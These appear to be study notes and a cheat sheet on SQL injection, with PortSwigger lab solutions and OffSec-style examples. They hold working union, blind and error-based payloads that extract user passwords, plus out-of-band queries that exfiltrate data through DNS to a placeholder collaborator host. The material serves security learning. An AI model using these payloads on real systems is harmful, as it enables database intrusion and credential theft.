# SQL Injection Attacks

SQLi vulnerabilities enable attackers to meddle with SQL queries exchanged between the web application and database. SQL vulnerabilities typically allow the attacker to extend the original application query to include database tables that would normally be inaccessible.

We can better understand this concept by examining the  following backend PHP code portion that is responsible for verifying user-submitted credentials during login:
```bash
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```

When testing a web application, we sometimes lack prior knowledge of the underlying database system, so we should be prepared to interact with different SQL database variants. The most common variants are MySQL and Microsoft SQL Server (MSSQL).

Learning Resource: https://portswigger.net/web-security/learning-paths/sql-injection/

## Types

**In-band**: You use the same communication channel to both launch an attack and receive feedback from the backend. 

- **Error-based**: Forces the database into generating an error, giving the attacker information upon which to refine the payload.

- **Union**: Leverages the UNION SQL operater to combine the results of two queries into a single result set

**Inferential (Blind)**: You don't receive feedback.

- **Boolean-based**: Uses boolean conditions to return a different result depending on whether the query returns a true or false result
```bash
select title from product where id =1 and 1=2
```
Payload:
```bash
www.random.com/app.php?id=1 and SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's'
```
Check if the first character in the password is an 's' (if nothing is returned on the page it's false). You can iterate through the password. Automate this.
- **Time-based**: Relies on th e database pausting for a specified amount of time before returning the results
**Out-of-band**: Unable to use the same channel as the db; unable to make a connection. Consists of triggering an out-of-band network connection to a system that you control.
- Not common, a variety of protocols can be used (ex. DNS, HTTP)
- Database specific, can be used to exfil data


## How to Find

**Black-Box**

- Map the application, it's logic, directories, input vectors, domains, pages, while Burp Proxy is intercepting traffic

- Fuzz the application: see how the application responds in unusual ways to special characters, and then refine the fuzzing. Submit boolean conditions such as 'OR 1=1', 'OR 1=2' and see how it responds. Do the same with time delays. Submit OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor for any resulting interactions.

**White-Box**

- **Enable web server logging**: helps when fuzzing the application to receive the errors occuring, and helps refine the payload. 

- **Enable database logging**: seeing how it was logged at the backend will allow you to see which characters made it through and how they made it through

- **Map the application**: Visible functionality in the application. Regex search on all instances in the code that talk to the database. 

- **Code Review**: Follow the code path for all input vectors, walk down the functionality

- **Test**

Alternatively, you can find the majority of SQL injection vulnerabilities quickly and reliably using Burp Scanner. 

## How to Exploit

To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:

- The type and version of the database software.
- The tables and columns that the database contains.

### Error-based: 
- Submit SQL-specific characters such as ' or ", and look for errors or other anomolies
- Different characters can give you different errors

### Union:
- *The number and the order of the columns must be the same in all queries & the data types must be compatible*

- Figure out he number of columns that the query is making

- Figure out the data types of the columns (mainly interested in string data), and whether the columns from the original query are of a suitable data type to hold the results from the injected query

- Use the UNION operator to output information from the database

**ORDER BY**: Used to determine the number of columns required in a SQL injection UNION attack

- incrementally inject a series of ORDER BY caluses until you get an error or observe a different behaviour in the application; may just return a db error in its http response, or return no error at all

```bash
select title, cost from product where id =1 order by 1
```

**NULL**: Another way to determine the number of columns required
- Incrementally inject a series of UNION SELECT payloads specifying a different number of null values until you no longer get an error

```bash
select title, cost from product where id =1 UNION SELECT NULL--
select title, cost from product where id =1 UNION SELECT NULL, NULL--
```

- If NULL & NULL, NULL returns an error the number of columns is greater than two; may just return a db error in its http response, or return no error at all

- When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column

- The effect on the HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a NullPointerException.

- In the worst case, the response might look the same as a response caused by an incorrect number of nulls. This would make this method ineffective. 

Finding columns with a useful data type in a SQL injection UNION attack:

- Probe each column to test whether it can hold string data by submitting a series of UNION SELECT payloads that place a string value into each column in turn

```bash
# Assumes there are 3 columns
' UNION SELECT 'a', NULL, NULL--

Conversion failed when converting the varchar 'a' to data type int.

' UNION SELECT NULL,'a', NULL--
...
```

If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data. 

**Boolean-based**

- First, submit a boolean condition that evaluates to False and not the response

- Then, submit a boolean condition that evaluates to True and not the response

- If the two above responses are different, then you have a boolean-based blind boolean statement.

- You can later check the boolean responses against the above responses to test for true or false

**Time-based**

- Just like boolean based, but inspect for whether the time delay is the same or not with conditions

Solutions:

```bash
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
https://0ae7005c.web-security-academy.net/filter?category=Food%27+OR+1=1--
# in the url

SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
administrator'-- 
# in the username input section

https://0a5f008503774e3285381ed3000900ef.web-security-academy.net/filter?category=Accessories%27UNION%20SELECT%20NULL,%20NULL,%20NULL--
# in the url to test for the number of columns
#or 
https://0a4f00bf03dfe32e8042d000006c0008.web-security-academy.net/filter?category=%27ORDER%20BY%204--


https://0a4f00bf03dfe32e8042d000006c0008.web-security-academy.net/filter?category=%27UNION%20SELECT%20NULL,%20%27E2ioJx%27,%20NULL--

https://0a6e00490459ba1a80eb5866000a0056.web-security-academy.net/filter?category='UNION SELECT username, password FROM users--
# 2 column table named users, columns names are username and password

https://0ae40036034b6b0d8575b95b0014005c.web-security-academy.net/filter?category=%27UNION%20SELECT%20NULL,%20username%20||%27~%27||%20password%20FROM%20users--
# concatenated username and password with ~

GET /filter?category=Accessories'union select table_name,null from information_schema.tables--
# modified http request in burp suite to get table names

GET /filter?category=Accessories'union select column_name,null from information_schema.columns where table_name='users_kgsxxq'-- HTTP/2
# modified the http request in burp suite to get columns from a specific table; values showed up in the middle of the content

GET /filter?category=Accessories'union select username_ixtpyy,password_xlduvn from users_kgsxxq-- HTTP/2
# modify http header to retrieve values from the users and password columns above from specific table

GET / HTTP/2
Host: 0a9600cf0420fce980b3e0e8005b008a.web-security-academy.net
Cookie: TrackingId=6nGoAICJu8E09Xhv'+and+(select+username+from+users	where+username%3d'administrator')%3d'administrator'--; session=KCRVz5UFM8CpNzQcEKZ46N2A3lzMgjsU
# if true, then the user, 'administrator', exists

GET / HTTP/2
Host: 0a9600cf0420fce980b3e0e8005b008a.web-security-academy.net
Cookie: TrackingId=6nGoAICJu8E09Xhv'+and+(select+username+from+users+where+username%3d'administrator'+and+LENGTH(password)>19)='administrator'--'; session=KCRVz5UFM8CpNzQcEKZ46N2A3lzMgjsU
# check for username and password length, use intruder to iterate numbers for you

GET / HTTP/2
Host: 0a9600cf0420fce980b3e0e8005b008a.web-security-academy.net
Cookie: TrackingId=6nGoAICJu8E09Xhv'+and+(select+substring(password,§1§,1)+from+users+where+username%3d'administrator')%3d'§a§'--'; session=KCRVz5UFM8CpNzQcEKZ46N2A3lzMgjsU
# what the positions looks like for intruder
```

### MySQL

Using the mysql command, you can connect to the remote SQL instance by specifying root as username and password, along with the default MySQL server port 3306.
```bash
kali@kali:~$ mysql -u root -p'root' -h 192.168.50.16 -P 3306

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```
The root user in this example is the database-specific 
root user, not the the system-wide administrative root user.

Show version and user.
```bash
MySQL [(none)]> select version();
+-----------+
| version() |
+-----------+
| 8.0.21    |
+-----------+
1 row in set (0.107 sec)

MySQL [(none)]> select system_user();
+--------------------+
| system_user()      |
+--------------------+
| root@192.168.20.50 |
+--------------------+
1 row in set (0.104 sec)
```

Collect a list of databases:
```bash
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| test               |
+--------------------+
5 rows in set (0.107 sec)
```

As an example, let's retrieve the password of the offsec user present in the mysql database.
```bash
MySQL [mysql]> SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
+--------+------------------------------------------------------------------------+
| user   | authentication_string                                                  |
+--------+------------------------------------------------------------------------+
| offsec | $A$005$?qvorPp8#lTKH1j54xuw4C5VsXe5IAa1cFUYdQMiBxQVEzZG9XWd/e6|
+--------+------------------------------------------------------------------------+
1 row in set (0.106 sec)
```
To improve its security, the user's password is stored in the authentication_string field as a Caching-SHA-256 algorithm.

#### MSSQL

A built-in command-line tool named SQLCMD allows SQL queries to be run through the Windows command prompt or even remotely from another machine.

Kali Linux includes Impacket, a Python framework that enables network protocol interactions. Among many other protocols, it supports Tabular Data Stream (TDS), the protocol adopted by MSSQL that is implemented in the impacket-mssqlclient tool.

Run **impacket-mssqlclient** to connect to the remote Windows machine running MSSQL by providing a username, a password, and the remote IP, together with the -windows-auth keyword. This forces NTLM authentication (as opposed to Kerberos)
```bash
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL>
```

Every database management system has its own syntax that we should take into consideration when enumerating a target during a penetration test.
```bash
SQL>SELECT @@version;
...

Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
	Sep 24 2019 13:48:23
	Copyright (C) 2019 Microsoft Corporation
	Express Edition (64-bit) on Windows Server 2022 Standard 10.0 <X64> (Build 20348: ) (Hypervisor)
```

When using a SQL Server command line tool like sqlcmd, we must submit our SQL statement ending with a semicolon followed by GO on a separate line. However, when running the command remotely, we can omit the GO statement since it's not part of the MSSQL TDS protocol.

To list all the available databases, we can select all names from the system catalog.
```bash
SELECT name FROM sys.databases;
name
...
master

tempdb

model

msdb

offsec
```

### Union-based Payloads

The UNION keyword aids exploitation because it enables execution of an extra SELECT statement and provides the results in the same query, thus concatenating two queries into one statement.

For UNION SQLi attacks to work, we first need to satisfy two conditions:

    1. The injected UNION query has to include the same number of columns as the original query.
    2. The data types need to be compatible between each column.

To demonstrate this concept, let's test a web application with the following preconfigured SQL query:
```bash
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```
The query fetches all the records from the customers table. It also includes the LIKE keyword to search any name values containing our input that are followed by zero or any number of characters, as specified by the percentage (%) operator.

Before crafting an attack strategy, we need to know the exact number of columns present in the target table. To discover the correct number of columns, we can submit the following injected query into the search bar:
```bash
' ORDER BY 1-- //
```
The above statement orders the results by a specific column, meaning it will fail whenever the selected column does not exist. Increasing the column value by one each time, we'll discover that the table has five columns, since ordering by column six returns an error.

With this information in mind, we can attempt our first attack by enumerating the current database name, user, and MySQL version.
```bash
%' UNION SELECT database(), user(), @@version, null, null -- //
```
Since we want to retrieve all the data from the customers table, we'll use the percentage sign followed by a single quote to close the search parameter. Then, we begin our injected query with a UNION SELECT statement that dumps the current database name, the user, and the MySQL version in the first, second, and third columns, respectively, leaving the remaining two null.

After launching our attack, we'll notice that the username and the DB version are present on the last line, but the current database name is not. This happens because column 1 is typically reserved for the ID field consisting of an integer data type, meaning it cannot return the string value we are requesting through the SELECT database() statement.

With this in mind, let's update our query by shifting all the enumerating functions to the right-most place, avoiding any type mismatches. Since we already verified the expected output, we can omit the percentage sign and rerun our modified query.

```bash
' UNION SELECT null, null, database(), user(), @@version  -- //
```

Let's extend our tradecraft and verify whether other tables are present in the current database. We can start by enumerating the information schema of the current database from the information_schema.columns table.

	INFORMATION_SCHEMA provides access to database metadata, information about the MySQL server such as the name of a database or table, the data type of a column, or access privileges. Other terms that are sometimes used for this information are data dictionary and system catalog. 

```bash
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

Interestingly, we discovered a new table named users that contains four columns, including one named password.

Let's craft a new query to dump the users table.
```bash
' UNION SELECT null, username, password, description, null FROM users -- //
```

### Blind SQL Injections

The SQLi payloads we have encountered are **in-band**, meaning we're able to retrieve the database content of our query inside the web application.

Alternatively, **blind SQL injections** describe scenarios in which database responses are never returned and behavior is inferred using either boolean- or time-based logic.

**Generic boolean-based blind SQL injections** cause the application to return different and predictable values whenever the database query returns a TRUE or FALSE result, hence the "boolean" name. These values can be reviewed within the application context.

**Time-based blind SQL injections** infer the query results by instructing the database to wait for a specified amount of time. Based on the response time, the attacker is able to conclude if the statement is TRUE or FALSE.

To test for boolean-based SQLi, we can try to append the below payload to the URL:
```bash
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```
Since 1=1 will always be TRUE, the application will return the values only if the user is present in the database. Using this syntax, we could enumerate the entire database for other usernames or even extend our SQL query to verify data in other tables.

We can achieve the same result by using a time-based SQLi payload:
```bash
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```
In this case, we appended an IF condition that will always be true inside the statement itself, but will return false if the user is non-existent.

This attack angle can clearly become very time consuming, so it's often automated with tools like sqlmap.

**Initially pinpoint the parameter affected by the blind SQL injection through manual examination and only then pass this information to any automated tool such as SQLmap.**

#### Substrings 

For example, suppose there is a table called Users with the columns Username and Password, and a user called Administrator. You can determine the password for this user by sending a series of inputs to test the password one character at a time. Note that you can use boolean-based SQLi in order to figure out the structure, and get to this point.

You can check if a particular user exists, check for the length of names, and compare values.

To do this, start with the following input:

```bash
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than m.

Next, we send the following input:

```bash
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than t.

Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is s:

```bash
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

You can do this until you have the whole password.

### Good to Know

On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like:

```bash
' UNION SELECT NULL FROM DUAL--
```

The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment. 

## SQL Injection Cheat Sheet

This SQL injection cheat sheet contains examples of useful syntax for a variety of tasks that often arise when performing SQL injection attacks.

---

### String Concatenation
Concatenate multiple strings into a single string.

- **Oracle**: `'foo'||'bar'`
- **Microsoft**: `'foo'+'bar'`
- **PostgreSQL**: `'foo'||'bar'`
- **MySQL**: `'foo' 'bar'` [Note the space between the two strings] or `CONCAT('foo','bar')`

---

### Substring
Extract part of a string from a specified offset with a specified length.

- **Oracle**: `SUBSTR('foobar', 4, 2)`
- **Microsoft**: `SUBSTRING('foobar', 4, 2)`
- **PostgreSQL**: `SUBSTRING('foobar', 4, 2)`
- **MySQL**: `SUBSTRING('foobar', 4, 2)`

---

### Comments
Truncate a query with comments.

- **Oracle**: `--comment`
- **Microsoft**: `--comment` or `/*comment*/`
- **PostgreSQL**: `--comment` or `/*comment*/`
- **MySQL**: `#comment` or `-- comment` [Note the space after the double dash] or `/*comment*/`

---

### Database Version
Query the database type and version.

- **Oracle**: `SELECT banner FROM v$version; SELECT version FROM v$instance`
- **Microsoft**: `SELECT @@version`
- **PostgreSQL**: `SELECT version()`
- **MySQL**: `SELECT @@version`

---

### Database Contents
List tables and columns in the database.

- **Oracle**: 
  - `SELECT * FROM all_tables`
  - `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`
- **Microsoft**: 
  - `SELECT * FROM information_schema.tables`
  - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
- **PostgreSQL**: 
  - `SELECT * FROM information_schema.tables`
  - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
- **MySQL**: 
  - `SELECT * FROM information_schema.tables`
  - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`

---

### Conditional Errors
Test a boolean condition and trigger an error if true.

- **Oracle**: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`
- **Microsoft**: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`
- **PostgreSQL**: `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`
- **MySQL**: `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`

---

### Extracting Data via Visible Error Messages
Elicit error messages that leak data.

- **Microsoft**: `SELECT 'foo' WHERE 1 = (SELECT 'secret')` 
  > Conversion failed when converting the varchar value 'secret' to data type int.
- **PostgreSQL**: `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` 
  > invalid input syntax for integer: "secret"
- **MySQL**: `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))` 
  > XPATH syntax error: '\secret'

---

### Batched (or Stacked) Queries
Execute multiple queries in succession.

- **Oracle**: Does not support batched queries.
- **Microsoft**: `QUERY-1-HERE; QUERY-2-HERE` or `QUERY-1-HERE QUERY-2-HERE`
- **PostgreSQL**: `QUERY-1-HERE; QUERY-2-HERE`
- **MySQL**: `QUERY-1-HERE; QUERY-2-HERE`
  - Note: With MySQL, batched queries are typically not used for SQL injection. Exceptions exist when the target application uses certain PHP or Python APIs with MySQL.

---

### Time Delays
Cause a time delay when the query is processed.

- **Oracle**: `dbms_pipe.receive_message(('a'),10)`
- **Microsoft**: `WAITFOR DELAY '0:0:10'`
- **PostgreSQL**: `SELECT pg_sleep(10)`
- **MySQL**: `SELECT SLEEP(10)`

---

### Conditional Time Delays
Test a boolean condition and trigger a time delay if true.

- **Oracle**: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`
- **Microsoft**: `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`


- **PostgreSQL**: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`
- **MySQL**: `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`

---

### DNS Lookup
Cause a DNS lookup to an external domain.

- **Oracle**: 
  - (XXE) vulnerability method: `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
  - Fully patched method (requires privileges): `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`
- **Microsoft**: `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`
- **PostgreSQL**: `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`
- **MySQL** (Windows only): 
  - `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`
  - `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`

---

### DNS Lookup with Data Exfiltration
Cause a DNS lookup with the results of an injected query.

- **Oracle**: `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
- **Microsoft**: 
  ```sql
  declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);
  exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
  ```
- **PostgreSQL**: 
  ```sql
  create OR replace function f() returns void as $$
  declare c text;
  declare p text;
  begin
  SELECT into p (SELECT YOUR-QUERY-HERE);
  c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
  execute c;
  END;
  $$ language plpgsql security definer;
  SELECT f();
  ```
- **MySQL** (Windows only): `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`

---